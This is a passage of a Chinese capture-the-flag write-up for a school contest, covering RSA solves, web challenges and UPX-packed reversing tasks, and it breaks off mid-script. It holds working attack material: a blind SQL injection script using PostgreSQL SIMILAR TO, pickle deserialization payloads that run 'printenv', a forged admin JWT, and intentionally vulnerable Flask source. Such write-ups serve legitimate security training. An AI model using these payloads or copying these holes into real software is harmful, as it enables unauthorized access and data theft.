n)</span><br><span class="line">        if x == 1:</span><br><span class="line">            success = True</span><br><span class="line">            break</span><br><span class="line">        elif x == n - 1:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            y = x</span><br><span class="line"></span><br><span class="line">    if success:</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">if success:</span><br><span class="line">    p = libnum.gcd(y - 1, n)</span><br><span class="line">    q = n // p</span><br><span class="line">    print(&#x27;P: &#x27; + &#x27;%s&#x27; % p)</span><br><span class="line">    print(&#x27;Q: &#x27; + &#x27;%s&#x27; % q)</span><br><span class="line">    hash_result = hashlib.md5(str(p + q).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    print(b&#x27;QLNU&#123;&#x27; + hash_result.encode() + b&#x27;&#125;&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;Cannot compute P and Q&#x27;)</span><br></pre></td></tr></table></figure><p><code>QLNU&#123;88a27758257b7c87174b6ea972a1b854&#125;</code></p><h2 id="not-prime"><a href="#not-prime" class="headerlink" title="not_prime"></a>not_prime</h2><p>根据提示，e 和 phi 不互素</p><p>原题脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">m=bytes_to_long(b&#x27;xxxxxx&#x27;)</span><br><span class="line">p=getPrime(1024)</span><br><span class="line">q=getPrime(1024)</span><br><span class="line">e= 485</span><br><span class="line">n=p*q</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line">print(&quot;p=&quot;,p)</span><br><span class="line">print(&quot;q=&quot;,q)</span><br><span class="line">print(&quot;c=&quot;,c)</span><br><span class="line"></span><br><span class="line">#p= 90001590571628449882768356132693793320380710587438751445227717046797643492854890272077076028501400801674037970146456442693356333145725683391580452197350307034664396425412189131031945585055386833984609074633912616551061262531556612042816706715156941338165698736593509428548029187638818394121469201965625147221</span><br><span class="line">#q= 105269145185972005922101600001495560536711004054072625220240025622162044045232737266024106976484532324266604741308149241323569573803457119996593779129028876049944017213001133943043835369146690600654256999505984093654055465044150981679096848362996982680425629145233824412870249754368525048882875131030178432721</span><br><span class="line">#c= 4011466196771057453748051548070252889305829159014486083134296940977745797784900339093445458817425649129360677656834717166461191857503662276260763813274523589374268178658075412219913461626103952622745086746603503909555807801624176466958878038820537440624646031996479670501067595211298340535838371124894533011681024206320817178328457414141064757221298996098449657759602092816345597925775497162488952621217176091286174386154264803599820578496373057033647920530416431159596919698553375884228694958053211497272788860741443420407312773534728288229296432297638584262400238090812394095583427915756299194616536991896049110187</span><br></pre></td></tr></table></figure><p>利用脚本解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">p= 90001590571628449882768356132693793320380710587438751445227717046797643492854890272077076028501400801674037970146456442693356333145725683391580452197350307034664396425412189131031945585055386833984609074633912616551061262531556612042816706715156941338165698736593509428548029187638818394121469201965625147221</span><br><span class="line">q= 105269145185972005922101600001495560536711004054072625220240025622162044045232737266024106976484532324266604741308149241323569573803457119996593779129028876049944017213001133943043835369146690600654256999505984093654055465044150981679096848362996982680425629145233824412870249754368525048882875131030178432721</span><br><span class="line">e= 485</span><br><span class="line">c= 4011466196771057453748051548070252889305829159014486083134296940977745797784900339093445458817425649129360677656834717166461191857503662276260763813274523589374268178658075412219913461626103952622745086746603503909555807801624176466958878038820537440624646031996479670501067595211298340535838371124894533011681024206320817178328457414141064757221298996098449657759602092816345597925775497162488952621217176091286174386154264803599820578496373057033647920530416431159596919698553375884228694958053211497272788860741443420407312773534728288229296432297638584262400238090812394095583427915756299194616536991896049110187</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 当e约去公约数后与phi互素</span><br><span class="line">def decrypt(p, q, e, c):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - 1) * (q - 1)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = pow(c, d, n)</span><br><span class="line">    print(m)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    print(msg)</span><br><span class="line">    if msg[1]:</span><br><span class="line">        (print(long_to_bytes(msg[0])))</span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/HFW2bmTmHo8PXaxCtymcbJDznzb.png"></p><p><code>QLNU&#123;1f4154c0-9d88-4882-b41f-75ce14664c91&#125;</code></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Myjwt"><a href="#Myjwt" class="headerlink" title="Myjwt"></a>Myjwt</h2><p>看提示</p><p>jwt 是个啥</p><p>弱密钥</p><p>题目名字 myjwt 也是一个工具</p><p>这里使用 <a href="https://jwt.io/">https://jwt.io/</a></p><p>利用 myjwt 工具，获得密码</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/A6SvboDrooGIVMxzEIicMfqon1g.png"></p><p>使用 myjwt 得到新的 jwt，利用字典暴破得到密码为 12345678</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/A6yEbreyYovhTLxoDJacn9MenEc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJleHAiOjE3NDI3MzA0MTF9.D6_ADIpgPto9XWtPKPqN17CX3x1NZ3_1VoEIDhmsbXY</span><br></pre></td></tr></table></figure><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/IJ1dbzfmboy1zYx4z9qcEEeAnbc.png"></p><p>将 guest 改为 admin</p><p>密码为 12345678</p><p>得到新的 jwt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3NDI3MzA0MTF9.TNnlCu96PT8VmwGmzhmvcEiGDODVX7g_mu8B824rEKE</span><br></pre></td></tr></table></figure><p>再使用 insomnia</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/QHChbYXUvoT7OExvm2Gc97Mun2d.png"></p><p><code>flag&#123;8146d9bd-18d1-4512-bb44-c1a2dcf7d2f2&#125;</code></p><h2 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h2><p>根据已知条件，题目网址为 <a href="https://balabala.sky233.top/">https://balabala.sky233.top/</a></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/TfDebMD9lojT0cxHPhacsAaQnhf.png"></p><p>输入 <a href="https://balabala.sky233.top/robots.txt">https://balabala.sky233.top/robots.txt</a></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/FCR1bLcp1o3mmexmC82c8XyVnUg.png"></p><p>可以知道这道题目为 git 泄露<br>我是从虚拟机中解决的这道题</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/QGIUbKJpMo9ro1x8ATgc1wpYngX.jpg"></p><p>得到 flag</p><p><code>QLNU&#123;S1mpl3_g1t_AnD_sWp&#125;</code></p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>先看一下源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">from functools import cache</span><br><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line">import psycopg2</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag = Path(&quot;/app/f1aaaaaaggggggg&quot;).read_text().strip()</span><br><span class="line"></span><br><span class="line">white_list = set(&quot; &#x27;flag&#123;HeL10_W0rld&#125;&#x27;&quot; + string.digits + string.ascii_letters+&#x27;-&#x27;)</span><br><span class="line">black_list = [&quot;like&quot;]</span><br><span class="line"></span><br><span class="line">@cache</span><br><span class="line">def connect_database():</span><br><span class="line">    db_user = &quot;postgres&quot;</span><br><span class="line">    db_password = &quot;postgresql&quot;</span><br><span class="line">    db_host = &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">    connection = psycopg2.connect(user=db_user, password=db_password, host=db_host)</span><br><span class="line"></span><br><span class="line">    return connection</span><br><span class="line"></span><br><span class="line">with app.app_context():</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    conn = connect_database()</span><br><span class="line">    create_sql = &quot;&quot;&quot;</span><br><span class="line">        DROP TABLE IF EXISTS company;</span><br><span class="line">        CREATE TABLE IF NOT EXISTS company (</span><br><span class="line">            name TEXT</span><br><span class="line">        )</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    with conn.cursor() as sql:</span><br><span class="line">        sql.execute(create_sql)</span><br><span class="line">        sql.execute(&quot;SELECT COUNT(*) FROM company&quot;)</span><br><span class="line">        if sql.fetchall()[0][0] == 0:</span><br><span class="line">            sql.execute(&quot;INSERT INTO company (name) VALUES (&#x27;ikun&#x27;)&quot;)</span><br><span class="line">            sql.execute(&quot;INSERT INTO company (name) VALUES (&#x27;man&#x27;)&quot;)</span><br><span class="line">            sql.execute(&quot;INSERT INTO company (name) VALUES (&#x27;%s&#x27;)&quot; % (flag))</span><br><span class="line">        conn.commit()</span><br><span class="line"></span><br><span class="line">@app.post(&quot;/submit&quot;)</span><br><span class="line">def submit_form():</span><br><span class="line">    conn = None</span><br><span class="line">    try:</span><br><span class="line">        username = request.form[&quot;username&quot;]</span><br><span class="line">        conn = connect_database()</span><br><span class="line"></span><br><span class="line">        for char in username:</span><br><span class="line">            if char not in white_list:</span><br><span class="line">                return &quot;你这名字有点奇怪emmm&quot;, 400</span><br><span class="line"></span><br><span class="line">        for forbidden_word in black_list:</span><br><span class="line">            if forbidden_word in username.lower():</span><br><span class="line">                return &quot;发现商业间谍，鸡毙你！！！&quot;, 400</span><br><span class="line"></span><br><span class="line">        with conn.cursor() as curr:</span><br><span class="line">            curr.execute(&quot;SELECT * FROM company WHERE name = &#x27;%s&#x27;&quot; % username)</span><br><span class="line">            result = curr.fetchall()</span><br><span class="line"></span><br><span class="line">        if len(result):</span><br><span class="line">            return &quot;恭喜你，开启美好的一天吧&quot;, 200</span><br><span class="line">        return &quot;你是新来的员工吗，我怎么不认识你&quot;, 201</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        return f&quot;Error: &#123;str(e)&#125;&quot;, 400</span><br><span class="line"></span><br><span class="line">    finally:</span><br><span class="line">        if conn is not None:</span><br><span class="line">            conn.commit()</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    return &quot;&quot;&quot;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;打卡机&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body style=&quot;background-image: url(//images/week1-web-校赛wp.assets/i_like_work.jpg)&quot;&gt;</span><br><span class="line">    &lt;a&gt;勤劳的打工人，请输入名字进行上班打卡&lt;/a&gt;</span><br><span class="line">    &lt;form action=&quot;/submit&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;width: 80vw&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&quot;&quot;&quot;, 200</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure><p>根据提示</p><p>不是 mysql</p><p><code>Postgresql</code></p><p>打开实例后是这样的</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Lwk1bgFsdoPSAuxvXAXcQc3Lnsx.png"></p><p><code>SIMILAR TO</code> 是 PostgreSQL 特有的模糊匹配操作符，其模式语法结合了 <code>LIKE</code> 的通配符（<code>%</code>、<code>_</code>）和正则表达式的元字符（如 <code>|</code>、<code>()</code>、<code>[]</code>）。<a href="https://blog.csdn.net/qq_32838955/article/details/105466577?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-105466577-blog-133937030.235%5Ev43%5Epc_blog_bottom_relevance_base5&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-105466577-blog-133937030.235%5Ev43%5Epc_blog_bottom_relevance_base5&utm_relevant_index=9">Postgresql 学习笔记之——模糊匹配 LIKE、SIMILAR TO 和 POSIX 正则表达式_sql similar to-CSDN 博客</a></p><p>SQL 通配符的应用 <a href="https://www.runoob.com/sql/sql-wildcards.html">https://www.runoob.com/sql/sql-wildcards.html</a></p><p>利用脚本进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &quot;http://101.35.218.130:32887/submit&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">payload = &quot;_&quot;</span><br><span class="line">words = string.ascii_letters + string.digits + &quot;&#123;&#125;- &quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line">&#125;</span><br><span class="line">#探测flag长度</span><br><span class="line">for i in range(1, 51):</span><br><span class="line">    flag = &quot;_&quot; * i</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;username&quot;: f&quot;1&#x27; or name similar to &#x27;&#123;flag&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data,headers=headers)</span><br><span class="line">    if &quot;恭喜你&quot; in response.text:</span><br><span class="line">        last_found_count=i</span><br><span class="line"></span><br><span class="line">#探测flag</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,last_found_count+1):</span><br><span class="line">    for j in words:</span><br><span class="line">        res = requests.post(url,data=&quot;username=1&#x27; or name SIMILAR TO &#x27;&quot; + (payload * (i - 1)) + j + (payload * (last_found_count - i)),headers=headers)</span><br><span class="line">        if &quot;恭喜你&quot; in res.text:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>运行结果获得 flag</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/PQzSbn4tWoFVSCxSJI6cBCvSntf.png"></p><p><code>QLNU&#123;45e30069-07f2-4026-b581-32058e8503fa&#125;</code></p><h2 id="Py"><a href="#Py" class="headerlink" title="Py"></a>Py</h2><p>先看一下源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, redirect, render_template, session</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">#该文件位于/app/app.py</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(24)</span><br><span class="line">FLAG = os.environ.get(&#x27;GZCTF_FLAG&#x27;, &#x27;CTF&#123;test_flag&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    if not session.get(&#x27;logged_in&#x27;):</span><br><span class="line">        return redirect(&#x27;/login&#x27;)</span><br><span class="line">    return redirect(&#x27;/dashboard&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">        password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">        if username == &#x27;admin&#x27; and password == &#x27;猜下密码&#x27;:</span><br><span class="line">            session[&#x27;logged_in&#x27;] = True</span><br><span class="line">            return redirect(&#x27;/dashboard&#x27;)</span><br><span class="line">        return &#x27;&lt;script&gt;alert(&quot;Invalid!&quot;); location.href=&quot;/login&quot;;&lt;/script&gt;&#x27;</span><br><span class="line">    return render_template(&#x27;login.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/dashboard&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def dashboard():</span><br><span class="line">    if not session.get(&#x27;logged_in&#x27;):</span><br><span class="line">        return redirect(&#x27;/login&#x27;)</span><br><span class="line">    </span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        data = request.form.get(&#x27;data&#x27;, &#x27;&#x27;)</span><br><span class="line">        try:</span><br><span class="line">            result = pickle.loads(bytes.fromhex(data))</span><br><span class="line">            return f&#x27;Data processed: &#123;str(result)&#125;&#x27;  # 显示反序列化结果</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return f&#x27;Error: &#123;str(e)&#125;&#x27;</span><br><span class="line">    </span><br><span class="line">    return render_template(&#x27;dashboard.html&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><p>登陆需要密码，可以尝试以下 Burp Suite 爆破，我们有字典</p><p>先添加 payload</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/XQ5HbNe3doCLjpx2PILcXdVTnfg.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Tb7nbIrd6ol93Ax7FWGcI9fannf.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/T26cbFN8CoEM44xeonYcOyfInYb.png"></p><p>得到密码为 admin123</p><p>输入后得到</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/CTj0bbW9yolujZxsJugcC58PnKb.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Raamb1eB0ovBnoxEd7Lcj0TynXb.png"></p><p>看源码中，与 pickle 反序列化</p><p>我们可以通过构造恶意的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">_class_ Exploit:</span><br><span class="line">    _def_ __reduce__(_self_):</span><br><span class="line">        _# 读取环境变量并返回_</span><br><span class="line">        return (os.getenv, (&#x27;GZCTF_FLAG&#x27;,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit()).hex()</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>这里也可以利用 <code>subprocess</code> 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 导入必要的模块</span><br><span class="line">import pickle    # Python对象序列化模块（危险：反序列化时可执行任意代码）</span><br><span class="line">import subprocess # 用于执行系统命令</span><br><span class="line"></span><br><span class="line"># 定义一个恶意类，利用pickle反序列化时自动调用的__reduce__方法</span><br><span class="line">class Exploit:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        当对象被pickle反序列化时，此方法会被调用</span><br><span class="line">        返回一个元组：(可调用对象, 参数元组)</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 返回subprocess.check_output函数和它的参数</span><br><span class="line">        # 参数是一个命令列表：[&quot;printenv&quot;, &quot;GZCTF_FLAG&quot;]</span><br><span class="line">        # 这个命令会打印环境变量GZCTF_FLAG的值</span><br><span class="line">        return (subprocess.check_output, ([&quot;printenv&quot;, &quot;GZCTF_FLAG&quot;],))</span><br><span class="line"></span><br><span class="line"># 生成恶意payload</span><br><span class="line"># 1. 创建Exploit对象</span><br><span class="line"># 2. pickle.dumps将其序列化为字节流</span><br><span class="line"># 3. .hex()将字节流转换为十六进制字符串（便于传输或存储）</span><br><span class="line">payload = pickle.dumps(Exploit()).hex()</span><br><span class="line"></span><br><span class="line"># 输出payload（十六进制形式）</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>依旧可以实现</p><p>得到</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/KPaJbFL7woJ9BYxPg7gcEk0WnOd.png"></p><p><code>80049522000000000000008c026f73948c06676574656e769493948c0a475a4354465f464c414794859452942e</code></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/KAbhby0LtoLEi8xQJ60cCkCgnRg.png"></p><p>获得 flag <code>QLNU&#123;a1fa2161-e736-4f91-9a50-596a0cc6f049&#125;</code></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Fly-Bird"><a href="#Fly-Bird" class="headerlink" title="Fly_Bird"></a>Fly_Bird</h2><p>先用 die 查一下，发现是用 upx 包裹的 32 位</p><p>所以先用 upx 脱壳</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/AQxTbbfukoDRMexonEKciXrqnJb.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/OF8tbBq5GotijHxtDKxcYP2dnEc.png"></p><p>这样就脱壳完成了，</p><p>再将其拖进 ida，就能找到 flag</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/YY9CbVuH0oTq4lxlTiNcXcQ7nBe.png"></p><p><code>QLNU&#123;no_pain_no_gains&#125;</code></p><h2 id="茶（promax-版）"><a href="#茶（promax-版）" class="headerlink" title="茶（promax 版）"></a>茶（promax 版）</h2><p>解压附件后是一个 exe 的格式文件，用 die 打开后发现有一处被魔改的 upx</p><p>壳</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/CXVRbuCrkou9IxxodrsckeA8nof.png"></p><p>接下来用 010 打开，进行修改</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/LmbYbp9Zlo0bUqx4VwcchQDInjV.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Cm95bYEb3omCvnxnGJKcStfZnXc.png"></p><p>保存后重新用 die 打开</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Twz4bz725oCTsFxfH5Ec2X7in5e.png"></p><p>一个普通的 upx 壳，进行脱壳</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/PR7Bb9eDUoCuaLxI0eccAjJenKd.png"></p><p>这样就脱壳成功了，接下来我们就可以把它放进 ida 中进行分析</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/H902bebQeo9MDMx8LDnckeS1ngc.png"></p><p>查看 unk_405020 的输入内容</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/JaK9b2XMHo15THxGYfOcAcJynTg.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/PTlIbEl4GocTvLxf6sycdJdEnEg.png"></p><p>看 enc 加密函数</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/HJaxbINjEo4wHLxphZScXoC6ndR.png"></p><ul><li>代码中 <code>sum -= 1640531527</code>：<ul><li><code>1640531527</code> 的十六进制是 <code>0x61C88647</code>，它是 <code>0x9E3779B9</code> 的补码表示（即 <code>-0x61C88647 = 0x9E3779B9</code>）。</li><li>这是 <strong>XXTEA&#x2F;TEA 家族算法</strong> 的标志性常量。</li></ul></li></ul><p>利用脚本解决这个问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 